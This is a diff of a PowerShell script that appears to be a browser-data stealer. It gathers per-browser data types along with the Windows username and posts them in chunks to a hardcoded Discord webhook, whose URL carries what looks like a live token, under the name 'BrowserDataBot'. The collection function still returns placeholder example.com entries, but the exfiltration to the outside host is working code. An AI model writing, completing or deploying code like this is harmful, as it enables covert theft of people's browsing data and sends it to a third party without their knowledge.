@@ -44,8 +44,12 @@ function Get-BrowserData {
         return $null
     }
 
-    # Return dummy data for now (replace with SQLite or JSON parsing logic)
-    return @{"Browser" = $Browser; "DataType" = $DataType; "Path" = $Path; "SampleData" = "Sample entry for testing"}
+    # Simulated data for testing
+    return @(
+        [PSCustomObject]@{Browser = $Browser; User = $env:USERNAME; DataType = $DataType; Data = "http://example.com/$DataType/1"}
+        [PSCustomObject]@{Browser = $Browser; User = $env:USERNAME; DataType = $DataType; Data = "http://example.com/$DataType/2"}
+        [PSCustomObject]@{Browser = $Browser; User = $env:USERNAME; DataType = $DataType; Data = "http://example.com/$DataType/3"}
+    )
 }
 
 function Upload-Discord {
@@ -57,20 +61,32 @@ function Upload-Discord {
 
     $WebhookURL = "https://discord.com/api/webhooks/1308657646064111617/0jk_WQbEbcvjfOdJgz71sHQT1FYkrVaijOysKMkove-YoA0JwomMJH0fgSAbNej5J5CL"
 
-    # Split long content into chunks under 2000 characters
-    $Chunks = $Content -split "(.{1,1999})" -ne ''
+    $Body = @{
+        username = "BrowserDataBot"
+        content  = $Content
+    }
+
+    try {
+        Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType 'application/json' -Body ($Body | ConvertTo-Json -Depth 10)
+    } catch {
+        Write-Error "Failed to upload to Discord: $_"
+    }
+}
+
+function Send-Table-To-Discord {
+    param (
+        [parameter(Position = 0, Mandatory = $True)]
+        [array]$Data
+    )
+
+    # Format the data as a table
+    $TableString = $Data | Format-Table -AutoSize | Out-String
+
+    # Split the table into chunks under 2000 characters
+    $Chunks = $TableString -split "(.{1,1999})" -ne ''
 
     foreach ($Chunk in $Chunks) {
-        $Body = @{
-            username = "BrowserDataBot"
-            content  = $Chunk
-        }
-
-        try {
-            Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType 'application/json' -Body ($Body | ConvertTo-Json -Depth 10)
-        } catch {
-            Write-Error "Failed to upload to Discord: $_"
-        }
+        Upload-Discord -Content "```\n$Chunk\n```"
     }
 }
 
@@ -82,8 +98,7 @@ foreach ($Browser in $BrowserList) {
     foreach ($DataType in $DataTypes) {
         $Data = Get-BrowserData -Browser $Browser -DataType $DataType
         if ($Data) {
-            $Content = ($Data | ConvertTo-Json -Depth 10)
-            Upload-Discord -Content $Content
+            Send-Table-To-Discord -Data $Data
         }
     }
 }
